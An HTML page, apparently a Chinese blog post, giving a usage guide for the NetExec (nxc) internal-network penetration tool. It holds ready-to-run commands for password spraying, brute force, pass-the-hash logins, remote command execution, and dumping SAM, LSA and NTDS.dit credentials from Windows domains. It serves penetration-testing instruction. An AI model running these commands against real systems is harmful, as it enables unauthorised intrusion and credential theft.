@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>NetExec（nxc）内网渗透工具指南 - the0n3</title>
+        <meta name="description" content="NetExec（命令行简称 nxc）是一款用于自动化网络安全评估、内网渗透测试和漏洞检测的开源工具，本文讲解用法：安装、认证、枚举、爆破与凭据提取、枚举、喷洒、执行命令与凭据转储，Windows AD域渗透利器。">
+    <link rel="canonical" href="https://the0n3.top/posts/nxc-usage/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="NetExec（nxc）内网渗透工具指南">
+    <meta property="og:description" content="NetExec（命令行简称 nxc）是一款用于自动化网络安全评估、内网渗透测试和漏洞检测的开源工具，本文讲解用法：安装、认证、枚举、爆破与凭据提取、枚举、喷洒、执行命令与凭据转储，Windows AD域渗透利器。">
+    <meta property="og:url" content="https://the0n3.top/posts/nxc-usage/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/netexec-usage/logo.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="NetExec（nxc）内网渗透工具指南">
+    <meta name="twitter:description" content="NetExec（命令行简称 nxc）是一款用于自动化网络安全评估、内网渗透测试和漏洞检测的开源工具，本文讲解用法：安装、认证、枚举、爆破与凭据提取、枚举、喷洒、执行命令与凭据转储，Windows AD域渗透利器。">
+        <meta name="twitter:image" content="https://the0n3.top/images/netexec-usage/logo.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 评论系统预连接：giscus 由前端按访客主题动态注入，提前建连可抵消注入延迟 -->
+    <link rel="preconnect" href="https://giscus.app" crossorigin>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/nav-menu/style.css">
+        <link rel="stylesheet" href="/assets/features/random-recommend/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                <details class="nav-menu">
+                    <summary class="nav-toggle" aria-label="打开菜单"><span aria-hidden="true">☰</span></summary>
+                </details>
+                <div class="nav-links">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                </div>
+                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>NetExec（nxc）内网渗透工具指南</h1>
+    <p>
+        <span class="meta">发布于: 2026-11-21 15:55</span>
+    </p>
+    <div class="post-body">
+        <p>NetExec（命令行简称 nxc）是一款用于自动化网络安全评估、内网渗透测试和漏洞检测的开源工具，也是经典工具 CrackMapExec（CME） 的活跃继任者。它常用于测试大型网络和 Windows 域（Active Directory）环境的安全状况。</p>
+<p><img src="/images/netexec-usage/logo.png" alt="netexec logo" decoding="async" width="767" height="383"></p>
+<h2>核心功能</h2>
+<p>多协议支持：支持 SMB、LDAP、WinRM、MSSQL、SSH、FTP、RDP、WMI、VNC、NFS 等多种网络协议。</p>
+<p>信息与资产枚举：可扫描存活主机，枚举共享目录、在线会话、域用户、密码策略及域内信息。</p>
+<p>认证与爆破：支持密码喷洒（Password Spraying）、暴力破解以及 Kerberos 认证相关测试。</p>
+<p>远程执行与凭据提取：在具备权限的情况下支持远程命令/PowerShell 执行，以及提取 SAM、LSA、NTDS 等凭据信息。</p>
+<p>模块化扩展：内置多种功能模块（-M），可联动漏洞检测或信息收集流程。</p>
+<h2>安装</h2>
+<p>建议使用 pipx 安装 NetExec：</p>
+<pre><code class="language-bash">sudo apt install pipx git
+pipx ensurepath
+pipx install git+https://github.com/Pennyw0rth/NetExec</code></pre>
+<p>通过 pipx 更新：</p>
+<pre><code class="language-bash">pipx upgrade netexec
+pipx reinstall netexec</code></pre>
+<p>kali 安装：</p>
+<pre><code class="language-bash">apt update
+apt install netexec</code></pre>
+<h2>基础用法</h2>
+<p>指定目标。每个协议都支持通过 CIDR 表示法、IP 地址、IP 地址范围、主机名、包含目标列表的文件或上述所有方式的组合来指定目标：</p>
+<pre><code class="language-bash">nxc &lt;protocol&gt; poudlard.wizard
+nxc &lt;protocol&gt; 192.168.1.0 192.168.0.2
+nxc &lt;protocol&gt; 192.168.1.0/24
+nxc &lt;protocol&gt; 192.168.1.0-28 10.0.0.1-67
+nxc &lt;protocol&gt; ~/targets.txt</code></pre>
+<p>认证。 NetExec 支持多种认证方式，包括用户名/密码、域用户、Kerberos 票据等。每种协议都支持以某种形式使用凭据。一般来说，要使用凭据，可以运行以下命令，使用 SMB 协议时，被入侵的用户很可能属于（本地）管理员组。</p>
+<pre><code class="language-bash">ip=192.168.1.1
+nxc &lt;protocol&gt; &lt;target(s)&gt; -u username -p password
+nxc smb $ip -u 'test' -p 'test'
+nxc smb $ip -u Administrator -H '13b29964cc2480b4ef454c59562e675c'
+nxc smb $ip -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c'
+nxc smb $ip -u 'test' -p 'test' --local-auth
+nxc smb $ip -u Administrator -H '13b29964cc2480b4ef454c59562e675c' --local-auth
+nxc smb $ip -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c' --local-auth</code></pre>
+<p>异常。当密码中包含 !、$ 等特殊字符时，务必用单引号包裹，避免被 shell 解释。若用户名或密码以 - 开头，会被解析为参数，需使用 -u='-a' -p='-b' 这种长参数格式传值。</p>
+<pre><code class="language-bash">nxc &lt;protocol&gt; &lt;target(s)&gt; -u username -p 'October2022!'
+nxc &lt;protocol&gt; &lt;target(s)&gt; -u='-a' -p='-b'</code></pre>
+<p>暴力破解。所有协议都支持暴力破解和密码喷洒攻击，通过指定一个或多个文件，nxc 将自动使用指定的协议对所有目标进行暴力破解登录：</p>
+<pre><code class="language-bash">nxc &lt;protocol&gt; &lt;target(s)&gt; -u username1 -p password1 password2
+nxc &lt;protocol&gt; &lt;target(s)&gt; -u username1 username2 -p password1
+nxc &lt;protocol&gt; &lt;target(s)&gt; -u ~/file_containing_usernames -p rockyou.txt
+nxc &lt;protocol&gt; &lt;target(s)&gt; -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes</code></pre>
+<p>Kerberos。NetExec 支持 Kerberos 身份验证。使用密码/哈希值，可自动处理 TGT/ST，KRB5CCNAME通过环境变量指定文件来使用现有票据。使用 <code>-k</code> 参数，NetExec 将尝试使用环境变量 KRB5CCNAME 指定的 Kerberos 票据进行身份验证，或者使用 <code>--use-kcache</code> 参数指定的票据缓存文件。</p>
+<pre><code class="language-bash">$ KRB5CCNAME=/home/bonclay/impacket/administrator.ccache
+$ nxc smb zoro.gold.local -u bonclay -p Ocotober2022 -k
+SMB         zoro.gold.local 445    ZORO             [*] Windows 10.0 Build 14393 (name:ZORO) (domain:gold.local) (signing:False) (SMBv1:False)
+SMB         zoro.gold.local 445    ZORO             [+] gold.local\bonclay
+
+$ export KRB5CCNAME=/home/bonclay/impacket/administrator.ccache 
+$ nxc smb zoro.gold.local --use-kcache
+SMB         zoro.gold.local 445    ZORO             [*] Windows 10.0 Build 14393 (name:ZORO) (domain:gold.local) (signing:False) (SMBv1:False)
+SMB         zoro.gold.local 445    ZORO             [+] gold.local\administrator (Pwn3d!)
+$ nxc smb zoro.gold.local --use-kcache -x whoami
+SMB         zoro.gold.local 445    ZORO             [*] Windows 10.0 Build 14393 (name:ZORO) (domain:gold.local) (signing:False) (SMBv1:False)
+SMB         zoro.gold.local 445    ZORO             [+] gold.local\administrator (Pwn3d!)
+SMB         zoro.gold.local 445    ZORO             [+] Executed command 
+SMB         zoro.gold.local 445    ZORO             gold\administrator</code></pre>
+<h2>模块</h2>
+<p>运行nxc <protocol> -L以查看指定协议的可用模块。</protocol></p>
+<p>例如，要查看 SMB 协议的所有模块：</p>
+<pre><code class="language-bash">nxc smb -L</code></pre>
+<p>查看模块选项：</p>
+<pre><code class="language-bash">nxc smb -M lsassy --options</code></pre>
+<p>常用模块</p>
+<pre><code class="language-bash">ip=192.168.6.240
+# 域控提权漏洞zerologon检测
+nxc smb $ip -u guest -p '' -M zerologon
+# nopac，域成员冒充域控漏洞检测
+nxc smb $ip -u guest -p pass -M nopac
+# ms17-010
+nxc smb $ip -u guest -p '' -M ms17-010
+# enum_ca，检查是否存在证书服务
+nxc smb $ip -u guest -p '' -M enum_ca
+# 杀软枚举
+nxc smb $ip -u guest -p '' -M enum_av</code></pre>
+<h2>枚举</h2>
+<p>检查网络上是否启用了空会话（也称为匿名会话）。这在域控制器上非常有用，可以用来枚举用户、组、密码策略等。</p>
+<pre><code class="language-bash">ip=192.168.6.240
+nxc smb $ip -u '' -p ''
+nxc smb $ip -u '' -p '' --shares
+nxc smb $ip -u '' -p '' --pass-pol
+nxc smb $ip -u '' -p '' --users
+nxc smb $ip -u '' -p '' --groups
+nxc smb $ip -u 'guest' -p ''
+nxc smb $ip -u 'guest' -p '' --shares
+nxc smb $ip -u 'guest' -p '' --pass-pol
+nxc smb $ip -u 'guest' -p '' --users
+nxc smb $ip -u 'guest' -p '' --groups</code></pre>
+<p>通过爆破 rid 枚举用户</p>
+<pre><code class="language-bash">nxc smb $ip -u 'guest' -p pass --rid-brute</code></pre>
+<p>枚举本地组</p>
+<pre><code class="language-bash">nxc smb $ip -u user -p pass --local-group</code></pre>
+<h2>密码喷洒</h2>
+<p>可以使用多个用户名或密码，只需用空格分隔用户名/密码即可。</p>
+<pre><code class="language-bash">nxc smb 192.168.1.101 -u user1 user2 user3 -p Summer18
+nxc smb 192.168.1.101 -u user1 -p password1 password2 password3</code></pre>
+<p>nxc 接受包含用户名和密码的 txt 文件。每行一个用户名/密码，注意账户可能被锁定，先检查密码策略。</p>
+<pre><code class="language-bash">nxc smb 192.168.1.101 -u /path/to/users.txt -p Summer18
+nxc smb 192.168.1.101 -u Administrator -p /path/to/passwords.txt</code></pre>
+<h2>命令执行</h2>
+<p>在 Windows 系统上执行命令需要管理员权限。如果使用的凭据集具有对主机的管理员访问权限，则会在身份验证成功时，在输出中附加“(Pwn3d!)”</p>
+<p>nxc 有三种不同的命令执行方法，默认按wmi、at、smb顺序尝试，直到成功为止。</p>
+<ul>
+<li>wmiexec通过 WMI 执行命令</li>
+<li>atexec通过 Windows 任务计划程序安排任务来执行命令</li>
+<li>smbexec通过创建和运行服务来执行命令</li>
+</ul>
+<p>可以使用 <code>-x</code> 参数指定要执行的命令，使用 <code>-X</code> 参数指定要执行的 PowerShell 命令，--exec-method参数强制使用指定的执行方法。</p>
+<pre><code class="language-bash">nxc smb $ip -u Administrator -p pass -x whoami
+nxc smb $ip -u Administrator -p pass -X 'Get-content C:\Windows\System32\drivers\etc\hosts'</code></pre>
+<h2>上传与下载</h2>
+<p>使用 NetExec 获取远程文件或发送远程文件</p>
+<pre><code class="language-bash"># 上传文件
+nxc smb 172.16.251.152 -u user -p pass --put-file /tmp/whoami.txt \\Windows\\Temp\\whoami.txt
+
+# 下载文件
+nxc smb 172.16.251.152 -u user -p pass --get-file \\Windows\\Temp\\whoami.txt /tmp/whoami.txt</code></pre>
+<h2>转储</h2>
+<p>使用 secretsdump.py 中的方法转储 SAM 哈希值，需要管理员权限。</p>
+<p>SAM 存本地账号的 LM/NT hash，LSA 存储本机机器账号凭据、服务账号明文密码、自动登录密码、DPAPI 密钥、缓存域凭据等，NTDS.dit 存储全域账号 NT/LM hash。</p>
+<pre><code class="language-bash"># 转储 SAM 哈希值
+nxc smb $ip -u UserName -p 'PASSWORDHERE' --sam
+nxc smb $ip -u UserName -p 'PASSWORDHERE' --sam secdump
+
+# 转储 LSA 凭据
+nxc smb $ip -u UserName -p 'PASSWORDHERE' --lsa
+nxc smb $ip -u UserName -p 'PASSWORDHERE' --lsa secdump
+
+# 转储 NTDS.dit 凭据
+nxc smb $ip -u UserName -p 'PASSWORDHERE' --ntds
+nxc smb $ip -u UserName -p 'PASSWORDHERE' --ntds --enabled
+nxc smb $ip -u UserName -p 'PASSWORDHERE' --ntds vss
+nxc smb $ip -u UserName -p 'PASSWORDHERE' --ntds --user Administrator
+
+# 转储 LSA 凭据和 NTDS.dit 凭据
+nxc smb $ip -u administrator -p pass -M lsassy
+nxc smb $ip -u administrator -p pass -M nanodump</code></pre>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <a href="/categories/%E5%B7%A5%E5%85%B7%E4%B8%8E%E6%95%88%E7%8E%87/">工具与效率</a>
+                                    <a href="/categories/Windows/">Windows</a>
+                            </span>
+                    </div>
+    </article>
+
+<section class="post-recommend markdown-alert markdown-alert-tip" data-featured-recommend dir="auto" hidden aria-labelledby="featuredRecommendTitle">
+    <p class="markdown-alert-title" id="featuredRecommendTitle">
+        <svg class="octicon octicon-light-bulb mr-2" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M8 1.5c-2.363 0-4 1.69-4 3.75 0 .984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75 0 0 1-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456 0 0 0-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863 0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751 0 0 1-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304 0-2.06-1.637-3.75-4-3.75ZM5.75 12h4.5a.75.75 0 0 1 0 1.5h-4.5a.75.75 0 0 1 0-1.5ZM6 15.25a.75.75 0 0 1 .75-.75h2.5a.75.75 0 0 1 0 1.5h-2.5a.75.75 0 0 1-.75-.75Z"></path></svg>推荐阅读
+    </p>
+    <div class="post-recommend__slot" data-featured-recommend-slot></div>
+</section>
+
+
+<section class="post-comments" aria-label="Comments"
+    data-giscus
+    data-theme-mode="auto"
+    data-theme-light="light"
+    data-theme-dark="dark"
+    data-repo="Apursuit/the0n3-blog"
+    data-repo-id="R_kgDORvPPbA"
+    data-category="Announcements"
+    data-category-id="DIC_kwDORvPPbM4C5KAt"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="top"
+    data-loading="lazy"
+    data-lang="zh-CN">
+    <div class="giscus"></div>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/blog-stats/script.js"></script>
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/giscus-theme/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
